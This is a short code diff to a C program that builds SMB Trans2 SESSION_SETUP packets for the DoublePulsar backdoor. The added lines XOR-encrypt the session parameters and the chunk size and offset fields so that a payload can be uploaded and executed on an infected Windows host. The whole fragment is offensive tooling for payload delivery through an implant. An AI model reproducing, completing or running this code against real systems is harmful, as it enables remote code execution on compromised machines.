@@ -781,6 +781,9 @@ int main(int argc, char* argv[])
 			smblen = bytesLeft+70+12; //BytesLeft + DoublePulsar Exec Packet Length + Trans2 SESSION_SETUP parameters
 			memcpy(big_packet+3, &smblen, 1);
 			
+			ChunkSize = bytesLeft ^ XorKey;
+			xor_payload(XorKey, SESSION_SETUP_PARAMETERS, 12);
+			
 			//FIX HERE but copy the encrypted SESSION_SETUP parameters here before copying the last encrypted portion of the payload
 			memcpy(big_packet + 70, SESSION_SETUP_PARAMETERS, 12);
 			
@@ -823,6 +826,11 @@ int main(int argc, char* argv[])
 		//big_packet[50] = '\x89';
 		//big_packet[51] = '\x1a';
 		//big_packet[52] = '\x00';
+		
+		OffsetOfChunkInPayload = ctx ^ XorKey;
+		
+		//XOR the SESSION_SETUP parameters
+		xor_payload(XorKey, SESSION_SETUP_PARAMETERS, 12);
 		
 		//copy the SESSION_SETUP parameters
 		memcpy(big_packet +  70, (char*)SESSION_SETUP_PARAMETERS, 12);
